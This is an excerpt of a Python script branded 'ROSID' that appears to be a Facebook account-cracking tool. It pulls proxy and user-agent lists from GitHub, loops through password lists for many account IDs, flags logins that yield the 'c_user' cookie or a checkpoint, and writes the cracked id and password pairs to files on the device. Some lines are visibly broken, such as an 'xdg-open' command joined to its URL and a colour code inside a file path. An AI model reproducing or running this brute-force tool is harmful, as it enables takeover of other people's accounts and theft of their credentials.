...
for xd in range(5000):
	...
	ugen.append(uaku2)
try:
	prox= requests.get('https://github.com/ROSID69/.ROSID-proxy.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Rosid456/Rosid1/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
logo=("""_______  _______  _______ _________ ______  
...
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : Md ABDUL ROSID 
\033[97;1m>>     Facebook : Md ABDUL ROSID 
\033[97;1m>>     Version  : 1.0
\033[97;1m>>     Git hup  : Rosid456
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> ROSID  VERSION :\x1b[1;92m 1.1 ')
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-openhttps://www.facebook.com/profile.php?id=100018760997097&mibextid=ZbWKwL/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[ROSID] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[ROSID-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/ROSID-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in ROSID:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Rosid-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[ROSID] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mROSID\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[ROSID-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[ROSID-OK] '+uid+' | '+ps+'\33[0;97m')
